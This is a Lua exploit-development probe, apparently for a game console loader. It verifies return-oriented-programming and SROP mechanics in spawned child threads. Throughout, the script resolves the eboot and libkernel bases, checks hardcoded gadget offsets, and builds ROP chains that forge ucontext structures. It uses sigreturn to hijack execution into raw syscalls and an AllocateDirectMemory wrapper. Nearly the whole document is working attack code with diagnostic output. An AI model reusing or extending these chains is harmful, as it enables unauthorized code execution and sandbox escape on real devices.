-- CRASH_CLASS: LOW
-- PROBE 528d: Diagnostic — verify child thread ROP + SROP mechanics
--
-- Before trusting 528c, verify each step independently:
--   [A] Minimal child: write sentinel + thr_exit (no getcontext/sigreturn)
--   [B] Child with getcontext: capture ucontext + write sentinel + thr_exit
--   [C] Child with getcontext + sigreturn(getpid): SROP from child thread
--   [D] If C works: SROP calling AllocateDirectMemory wrapper (6-arg, known good)

print("=== PROBE 528d: CHILD SROP DIAGNOSTICS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Ignore SIGSYS + SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local function eaddr(off) return eboot + uint64(off) end

-- Gadgets
local G = {
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    pop_rdx  = 0x3B02D7,
    pop_rcx  = 0xE64,
    mov_m    = 0x92C67,   -- mov [rdi], rax; ret
    bare_ret = 0x42,
}

-- Verify gadgets
local function vg(name, off, expect, nb)
    local d = rd(N(eboot) + off)
    if d == nil then return false end
    if d < 0 then d = d + 0x100000000 end
    local mask = 0
    for i = 0, nb - 1 do mask = mask + 0xFF * (2 ^ (i * 8)) end
    return (d % (mask + 1)) == expect
end

if not vg("pop_rax", G.pop_rax, 0xC358, 2) then print("GADGET FAIL"); return end
if not vg("pop_rdi", G.pop_rdi, 0xC35F, 2) then
    G.pop_rdi = 0x75DFE
    if not vg("pop_rdi_alt", G.pop_rdi, 0xC35F, 2) then print("GADGET FAIL"); return end
end
if not vg("mov_m", G.mov_m, 0xC3078948, 4) then print("GADGET FAIL"); return end
if not vg("bare_ret", G.bare_ret, 0xC3, 1) then print("GADGET FAIL"); return end
print("gadgets OK")

-- Shared buffers
local shared = memory.alloc(0x100)
z(shared, 0x100)

local sc455 = mk(455)
local sc_mmap = mk(477)

-- Helper: spawn child with a ROP chain, wait for done flag
local function run_child(label, build_chain_fn)
    z(shared, 0x80)

    local cstack = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if not cstack or N(cstack) == 0 then
        print("  " .. label .. ": mmap FAIL"); return false
    end

    -- Fake TCB
    local tcb = memory.alloc(0x1000)
    z(tcb, 0x1000)
    wq(N(tcb), uint64(N(tcb)))
    local tcb_ptr = memory.alloc(8)
    wq(N(tcb_ptr), uint64(N(tcb)))

    -- Build chain
    local chain_off = 0x100000
    local chain_base = N(cstack) + chain_off + 8
    local pos = chain_base

    local function emit(v) wq(pos, v); pos = pos + 8 end

    -- Always start with sysarch(SET_FSBASE)
    emit(eaddr(G.pop_rax)); emit(uint64(165))
    emit(eaddr(G.pop_rdi)); emit(uint64(129))
    emit(eaddr(G.pop_rsi)); emit(uint64(N(tcb_ptr)))
    emit(stub)

    -- Custom chain
    build_chain_fn(emit, cstack)

    -- End with thr_exit
    emit(eaddr(G.pop_rax)); emit(uint64(431))
    emit(eaddr(G.pop_rdi)); emit(uint64(0))
    emit(stub)

    local chain_len = pos - chain_base
    print("  " .. label .. ": chain=" .. chain_len .. " bytes")

    -- thr_param
    local child_stack_sz = chain_off + 0x10
    local param = memory.alloc(0x40)
    z(param, 0x40)
    wq(N(param) + 0x00, eaddr(G.bare_ret))
    wq(N(param) + 0x08, uint64(0))
    wq(N(param) + 0x10, cstack)
    wq(N(param) + 0x18, uint64(child_stack_sz))
    local tid_p = memory.alloc(8)
    wq(N(tid_p), uint64(0))
    wq(N(param) + 0x30, uint64(N(tid_p)))

    local ok_t, ret_t = pcall(function()
        return sc455(uint64(N(param)), uint64(0x38))
    end)

    if not ok_t then
        print("  " .. label .. ": thr_new FAIL"); return false
    end
    print("  " .. label .. ": thr_new ret=" .. N(ret_t))

    -- Wait for done
    local done = false
    for _ = 1, 500000 do
        local flag = rq(N(shared) + 0x10)
        if flag and N(flag) == 0xDEAD then done = true; break end
        local x = 0; for k = 1, 50 do x = x + k end
    end

    if not alive() then
        print("  " .. label .. ": PROCESS DIED"); return false
    end

    local tid = rq(N(tid_p))
    print("  " .. label .. ": done=" .. tostring(done) .. " tid=" .. fmt(tid))
    return done
end

-- ============================================================
-- [A] Minimal child: sentinel + thr_exit
-- ============================================================
print("")
print("[A] Minimal child (sentinel only)")

local ok_a = run_child("A", function(emit, cstack)
    -- Write 0xCAFE to shared+0x00
    emit(eaddr(G.pop_rax)); emit(uint64(0xCAFE))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared)))
    emit(eaddr(G.mov_m))
    -- Write 0xDEAD to shared+0x10 (done flag)
    emit(eaddr(G.pop_rax)); emit(uint64(0xDEAD))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared) + 0x10))
    emit(eaddr(G.mov_m))
end)

if ok_a then
    local val = rq(N(shared))
    print("  shared[0]=" .. fmt(val) .. " (expect 0xCAFE)")
end

if not alive() then print("DIED after A"); return end

-- ============================================================
-- [B] Child with getcontext
-- ============================================================
print("")
print("[B] Child with getcontext")

local uctx_b = memory.alloc(0x500)
z(N(uctx_b), 0x500)

local ok_b = run_child("B", function(emit, cstack)
    -- getcontext(421, &uctx_b)
    emit(eaddr(G.pop_rax)); emit(uint64(421))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_b)))
    emit(stub)
    -- Write 0xBEEF to shared+0x00 (post-getcontext marker)
    emit(eaddr(G.pop_rax)); emit(uint64(0xBEEF))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared)))
    emit(eaddr(G.mov_m))
    -- Done
    emit(eaddr(G.pop_rax)); emit(uint64(0xDEAD))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared) + 0x10))
    emit(eaddr(G.mov_m))
end)

if ok_b then
    local val = rq(N(shared))
    print("  shared[0]=" .. fmt(val) .. " (expect 0xBEEF)")
    -- Read key ucontext fields
    local MC = 0x40
    local uc_rip = rq(N(uctx_b) + MC + 0xA0)
    local uc_rsp = rq(N(uctx_b) + MC + 0xB8)
    local uc_rax = rq(N(uctx_b) + MC + 0x38)
    print("  uctx RIP=" .. fmt(uc_rip))
    print("  uctx RSP=" .. fmt(uc_rsp))
    print("  uctx RAX=" .. fmt(uc_rax))
else
    print("  [B] FAILED — getcontext killed child?")
end

if not alive() then print("DIED after B"); return end

-- ============================================================
-- [C] Child SROP: getcontext + sigreturn(getpid)
-- ============================================================
print("")
print("[C] Child SROP (getpid via sigreturn)")

local uctx_c = memory.alloc(0x500)
z(N(uctx_c), 0x500)

local ok_c = run_child("C", function(emit, cstack)
    -- getcontext
    emit(eaddr(G.pop_rax)); emit(uint64(421))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c)))
    emit(stub)

    -- Mark post-getcontext
    emit(eaddr(G.pop_rax)); emit(uint64(0x1111))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared)))
    emit(eaddr(G.mov_m))

    -- Patch ucontext for sigreturn:
    --   mc_rax = 20 (getpid)
    --   mc_rip = syscall_addr (instruction that does syscall;ret)
    -- But we need the syscall address from the child's context.
    -- Problem: we don't have the child's syscall address until getcontext runs.
    --
    -- Alternative: patch mc_rip to the STUB address (stub = fn_addr which is
    -- already the syscall;ret address in the loader).
    -- But stub is the main thread's fn_addr. It should be the same address.
    -- Actually, stub = syscall.pipe.fn_addr which is a Lua userdata pointing
    -- to a "syscall; ret" gadget in the eboot. The child can use it too.
    --
    -- Actually for SROP, we need mc_rip = address of "syscall" instruction.
    -- The loader's stub IS a syscall;ret. So we can hardcode it.
    -- OR: read mc_rip from the getcontext result (which captured the child's
    -- RIP right after the syscall instruction) and subtract 2.
    --
    -- For now: read the getcontext-captured RIP, compute syscall addr from it,
    -- then patch. But from ROP we can't "read" — we can only write.
    --
    -- SIMPLEST: use the main thread's syscall address. It's the same binary.
    -- The getcontext syscall stub in the child is at the same virtual address
    -- as the main thread's (same eboot). BUT: the child's "syscall;ret" was
    -- called from our ROP chain via stub, so the captured RIP should be
    -- stub + 2 (past the syscall instruction). And stub = fn_addr.
    --
    -- We know stub from Lua. So: sc_addr_child = stub (the "syscall" byte).
    -- Actually stub points to "syscall;ret". The syscall is at stub+0, ret at +2.
    -- So mc_rip should be set to stub (= address of "syscall" instruction).
    -- After sigreturn, CPU executes "syscall" with rax=20 → returns pid.
    -- Then "ret" pops [RSP]... which goes where?
    --
    -- CRITICAL: after sigreturn(getpid), where does the child resume?
    -- sigreturn replaces the ENTIRE CPU state. The "ret" after "syscall"
    -- pops whatever mc_rsp points to. We need mc_rsp to point to a mini
    -- epilogue that stores rax and exits.
    --
    -- Build epilogue at a known location:
    local epi_off = 0x2000
    local epi = N(cstack) + epi_off
    local ep = epi
    local function ewq(v) wq(ep, v); ep = ep + 8 end
    -- After getpid returns in rax, store to shared+0x08
    ewq(eaddr(G.pop_rdi))
    ewq(uint64(N(shared) + 0x08))
    ewq(eaddr(G.mov_m))          -- shared[8] = rax (pid from srop)
    -- Done flag
    ewq(eaddr(G.pop_rax)); ewq(uint64(0xDEAD))
    ewq(eaddr(G.pop_rdi)); ewq(uint64(N(shared) + 0x10))
    ewq(eaddr(G.mov_m))
    -- thr_exit
    ewq(eaddr(G.pop_rax)); ewq(uint64(431))
    ewq(eaddr(G.pop_rdi)); ewq(uint64(0))
    ewq(stub)

    -- mc_rsp for post-sigreturn: point to epilogue
    -- "syscall;ret" → ret pops [RSP] = first epilogue gadget
    -- RSP should be epi (aligned properly: cstack+0x2000 is page-aligned)
    -- After sigreturn sets RSP=epi, "syscall;ret":
    --   syscall(getpid) → rax=pid
    --   ret → pops [epi] = pop_rdi gadget → continues epilogue
    local srop_rsp = epi

    -- Now patch ucontext via ROP (mov [rdi],rax pattern):
    local MC = 0x40

    -- mc_rax = 20 (getpid)
    emit(eaddr(G.pop_rax)); emit(uint64(20))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0x38))
    emit(eaddr(G.mov_m))

    -- mc_rip = stub (address of syscall instruction)
    emit(eaddr(G.pop_rax)); emit(stub)
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0xA0))
    emit(eaddr(G.mov_m))

    -- mc_rsp = srop_rsp (epilogue chain)
    emit(eaddr(G.pop_rax)); emit(uint64(srop_rsp))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0xB8))
    emit(eaddr(G.mov_m))

    -- Mark pre-sigreturn
    emit(eaddr(G.pop_rax)); emit(uint64(0x2222))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared)))
    emit(eaddr(G.mov_m))

    -- sigreturn(417, &uctx_c)
    emit(eaddr(G.pop_rax)); emit(uint64(417))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c)))
    emit(stub)

    -- (never reaches here — sigreturn replaces CPU state)
    -- thr_exit is in the epilogue chain above
end)

if ok_c then
    local marker = rq(N(shared))
    local srop_result = rq(N(shared) + 0x08)
    print("  shared[0]=" .. fmt(marker) .. " (0x2222=pre-sigreturn)")
    print("  shared[8]=" .. fmt(srop_result) .. " (expect pid=" .. pid .. ")")
    if srop_result and N(srop_result) == pid then
        print("  *** CHILD SROP WORKS! ***")
    end
else
    print("  [C] FAILED")
    -- Check marker
    local marker = rq(N(shared))
    print("  shared[0]=" .. fmt(marker))
    if marker and N(marker) == 0x1111 then
        print("  getcontext OK but sigreturn killed child")
    elseif marker and N(marker) == 0x2222 then
        print("  patches OK but sigreturn killed child")
    else
        print("  child died before getcontext completed")
    end
end

if not alive() then print("DIED after C"); return end

-- ============================================================
-- [D] Child SROP → AllocateDirectMemory wrapper (6-arg C call)
-- ============================================================
-- KEY QUESTION: Can a child thread call a libkernel WRAPPER via SROP?
-- 528c crashes when calling MapDirectMemory wrapper. If this also
-- crashes, the problem is generic (wrappers need TLS/stack state).
-- If this works, the problem is MapDirectMemory-specific (7th arg, etc).
--
-- AllocateDirectMemory = libkernel+0x17EF0
-- Signature: int fn(searchStart, searchEnd, len, align, memType, *physOut)
-- C ABI: rdi=searchStart, rsi=searchEnd, rdx=len, rcx=align, r8=memType, r9=physOut
print("")
print("[D] Child SROP → AllocateDirectMemory wrapper")

-- Get libkernel base
local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local lk_lo = rd(N(ib2) + 0x108) or 0
local lk_hi = rd(N(ib2) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end

if lk_lo == 0 and lk_hi == 0 then
    print("  libkernel h=0x2001 empty, scanning...")
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name = ""
            for i = 0, 31 do
                local b = rd(N(ib3) + 8 + i)
                if b then
                    local c = b % 256
                    if c == 0 then break end
                    if c >= 32 and c < 127 then name = name .. string.char(c) end
                end
            end
            if name:find("libkernel") then
                lk_lo = rd(N(ib3) + 0x108) or 0
                lk_hi = rd(N(ib3) + 0x10C) or 0
                if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
                if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
                print(string.format("  found libkernel h=0x%X", h))
                break
            end
        end
    end
end

local ok_d = false
if lk_lo == 0 and lk_hi == 0 then
    print("  libkernel NOT FOUND — skip D")
else
    local lk_text = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
    local alloc_fn = lk_text + uint64(0x17EF0)
    print("  libkernel=" .. fmt(lk_text))
    print("  AllocateDirectMemory=" .. fmt(alloc_fn))

    local phys_out = memory.alloc(8)
    wq(N(phys_out), uint64(0))

    local uctx_d = memory.alloc(0x500)
    z(N(uctx_d), 0x500)

    ok_d = run_child("D", function(emit, cstack)
        -- getcontext
        emit(eaddr(G.pop_rax)); emit(uint64(421))
        emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_d)))
        emit(stub)

        -- Mark post-getcontext
        emit(eaddr(G.pop_rax)); emit(uint64(0x3333))
        emit(eaddr(G.pop_rdi)); emit(uint64(N(shared)))
        emit(eaddr(G.mov_m))

        -- Build post-function epilogue at cstack+0x2000
        local epi = N(cstack) + 0x2000
        local ep = epi
        local function ewq(v) wq(ep, v); ep = ep + 8 end

        -- After AllocateDirectMemory returns, rax = return value
        -- Store rax to shared+0x08
        ewq(eaddr(G.pop_rdi))
        ewq(uint64(N(shared) + 0x08))
        ewq(eaddr(G.mov_m))       -- shared[8] = rax (alloc rv)
        -- Done flag
        ewq(eaddr(G.pop_rax)); ewq(uint64(0xDEAD))
        ewq(eaddr(G.pop_rdi)); ewq(uint64(N(shared) + 0x10))
        ewq(eaddr(G.mov_m))
        -- thr_exit
        ewq(eaddr(G.pop_rax)); ewq(uint64(431))
        ewq(eaddr(G.pop_rdi)); ewq(uint64(0))
        ewq(stub)

        -- Fake stack for the C function call
        -- fn_rsp must be ≡ 8 (mod 16) to simulate post-call alignment
        local fn_rsp = N(cstack) + 0x3008  -- 0x3000 is 16N, +8 = post-call
        wq(fn_rsp, uint64(epi))            -- [RSP+0] = return to epilogue

        -- Patch ucontext for sigreturn → AllocateDirectMemory call
        -- C ABI: rdi, rsi, rdx, rcx, r8, r9
        local MC = 0x40

        -- mc_rip = AllocateDirectMemory
        emit(eaddr(G.pop_rax)); emit(alloc_fn)
        emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_d) + MC + 0xA0))
        emit(eaddr(G.mov_m))

        -- mc_rsp = fn_rsp
        emit(eaddr(G.pop_rax)); emit(uint64(fn_rsp))
        emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_d) + MC + 0xB8))
        emit(eaddr(G.mov_m))

        -- mc_rdi = searchStart (0)
        emit(eaddr(G.pop_rax)); emit(uint64(0))
        emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_d) + MC + 0x08))
        emit(eaddr(G.mov_m))

        -- mc_rsi = searchEnd (0x150000000)
        emit(eaddr(G.pop_rax)); emit(uint64("0x150000000"))
        emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_d) + MC + 0x10))
        emit(eaddr(G.mov_m))

        -- mc_rdx = len (0x4000 = 16KB page)
        emit(eaddr(G.pop_rax)); emit(uint64(0x4000))
        emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_d) + MC + 0x18))
        emit(eaddr(G.mov_m))

        -- mc_rcx = align (0x4000) — C ABI arg4
        emit(eaddr(G.pop_rax)); emit(uint64(0x4000))
        emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_d) + MC + 0x50))
        emit(eaddr(G.mov_m))

        -- mc_r8 = memType (0)
        emit(eaddr(G.pop_rax)); emit(uint64(0))
        emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_d) + MC + 0x28))
        emit(eaddr(G.mov_m))

        -- mc_r9 = &phys_out
        emit(eaddr(G.pop_rax)); emit(uint64(N(phys_out)))
        emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_d) + MC + 0x30))
        emit(eaddr(G.mov_m))

        -- sigreturn → CPU jumps to AllocateDirectMemory
        emit(eaddr(G.pop_rax)); emit(uint64(417))
        emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_d)))
        emit(stub)
    end)

    if ok_d then
        local marker = rq(N(shared))
        local alloc_rv = rq(N(shared) + 0x08)
        local phys_val = rq(N(phys_out))
        print("  shared[0]=" .. fmt(marker) .. " (0x3333=post-gc)")
        print("  shared[8]=" .. fmt(alloc_rv) .. " (AllocateDirectMemory rv)")
        print("  phys_out=" .. fmt(phys_val))
        if alloc_rv and N(alloc_rv) == 0 then
            print("  *** CHILD SROP → WRAPPER CALL WORKS! ***")
        end
    else
        local marker = rq(N(shared))
        print("  shared[0]=" .. fmt(marker))
        if marker and N(marker) == 0x3333 then
            print("  getcontext OK but wrapper call KILLED child")
            print("  → WRAPPERS CRASH FROM CHILD SROP")
        else
            print("  child died before getcontext")
        end
    end
end

if not alive() then print("DIED after D"); return end

-- ============================================================
-- [E] Child SROP → raw syscall 20 (getpid) with r8/r9 set
-- ============================================================
-- Control experiment: same SROP shape as D (sets all regs including r8/r9)
-- but targets a raw syscall instead of a wrapper. If D fails and E works,
-- the problem is wrapper-specific (TLS, stack, internal state).
print("")
print("[E] Child SROP → raw syscall getpid with r8/r9 set")

local uctx_e = memory.alloc(0x500)
z(N(uctx_e), 0x500)

local ok_e = run_child("E", function(emit, cstack)
    emit(eaddr(G.pop_rax)); emit(uint64(421))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_e)))
    emit(stub)

    -- Epilogue
    local epi = N(cstack) + 0x2000
    local ep = epi
    local function ewq(v) wq(ep, v); ep = ep + 8 end
    ewq(eaddr(G.pop_rdi))
    ewq(uint64(N(shared) + 0x08))
    ewq(eaddr(G.mov_m))
    ewq(eaddr(G.pop_rax)); ewq(uint64(0xDEAD))
    ewq(eaddr(G.pop_rdi)); ewq(uint64(N(shared) + 0x10))
    ewq(eaddr(G.mov_m))
    ewq(eaddr(G.pop_rax)); ewq(uint64(431))
    ewq(eaddr(G.pop_rdi)); ewq(uint64(0))
    ewq(stub)

    local MC = 0x40
    -- mc_rip = stub (syscall;ret)
    emit(eaddr(G.pop_rax)); emit(stub)
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_e) + MC + 0xA0))
    emit(eaddr(G.mov_m))
    -- mc_rsp = epi
    emit(eaddr(G.pop_rax)); emit(uint64(epi))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_e) + MC + 0xB8))
    emit(eaddr(G.mov_m))
    -- mc_rax = 20 (getpid)
    emit(eaddr(G.pop_rax)); emit(uint64(20))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_e) + MC + 0x38))
    emit(eaddr(G.mov_m))
    -- mc_r8 = 0xAAAA (dummy, just to verify control)
    emit(eaddr(G.pop_rax)); emit(uint64(0xAAAA))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_e) + MC + 0x28))
    emit(eaddr(G.mov_m))
    -- mc_r9 = 0xBBBB (dummy)
    emit(eaddr(G.pop_rax)); emit(uint64(0xBBBB))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_e) + MC + 0x30))
    emit(eaddr(G.mov_m))

    -- sigreturn
    emit(eaddr(G.pop_rax)); emit(uint64(417))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_e)))
    emit(stub)
end)

if ok_e then
    local result = rq(N(shared) + 0x08)
    print("  shared[8]=" .. fmt(result) .. " (expect pid=" .. pid .. ")")
    if result and N(result) == pid then
        print("  *** r8/r9-shaped SROP works (raw syscall) ***")
    end
end

if not alive() then print("DIED after E"); return end

-- ============================================================
-- Summary
-- ============================================================
print("")
print("[SUMMARY]")
print("  A (minimal child)=" .. tostring(ok_a))
print("  B (getcontext)=" .. tostring(ok_b))
print("  C (SROP getpid)=" .. tostring(ok_c))
print("  D (SROP AllocateDM wrapper)=" .. tostring(ok_d))
print("  E (SROP getpid+r8r9)=" .. tostring(ok_e))
print("  alive=" .. tostring(alive()))
print("=== 528d COMPLETE ===")
